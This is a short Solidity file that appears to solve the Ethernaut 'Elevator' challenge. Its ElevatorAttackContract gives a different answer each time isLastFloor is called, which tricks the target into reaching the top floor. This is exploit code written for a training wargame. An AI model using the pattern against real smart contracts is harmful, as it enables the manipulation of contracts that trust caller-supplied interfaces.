// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

import {Script, console2} from "forge-std/Script.sol";

interface IElevator {
    function goTo(uint _floor) external;
}

contract ElevatorAttackContract {
    address challengeInstance;

    uint256 count = 1;

    constructor(address _challengeInstance) payable {
        challengeInstance = _challengeInstance;
    }

    function isLastFloor(uint _floor) external returns (bool) {
        if (count % 2 == 1) {
            count++;
            return false;
        } else {
            return true;
        }
    }

    function attack() external {
        IElevator(challengeInstance).goTo(5);
    }
}
